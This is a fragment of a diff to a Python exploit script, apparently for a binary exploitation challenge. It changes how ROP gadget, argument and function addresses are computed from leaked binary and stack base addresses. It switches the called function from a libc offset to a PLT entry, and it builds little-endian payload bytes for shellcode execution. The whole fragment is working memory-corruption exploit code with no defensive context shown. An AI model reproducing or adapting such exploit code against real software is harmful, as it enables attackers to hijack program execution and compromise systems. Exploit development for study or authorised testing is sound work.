@@ -97,7 +97,7 @@ try:
     gadget3 = bytearray.fromhex(hex(int(binary_base, 16) + int("0xe8f", 16))[2:])
     gadget3.reverse()
 
-    arg_addr = bytearray.fromhex(hex(int(binary_base, 16) + int("0x2AAAAAA8A000", 16))[2:])
+    arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - int("0x1F0C0", 16))[2:]) # change bc stack base
     arg_addr.reverse()
     
     arg_len = b"\x00\x10\x02"  # len of the shellcode as size_t
@@ -106,7 +106,7 @@ try:
 
     #TODO check funcaddr w zerochecker
 
-    funcaddr = hex((int(stack_base, 16) - 0x85D1000) + 0x101830 - 0x208B0) # now in libc, not local binary
+    funcaddr = hex(int(binary_base, 16) + 0x970) # IN PLT
     faddr_byte_array = bytearray.fromhex(funcaddr[2:])
     faddr_byte_array.reverse()
 
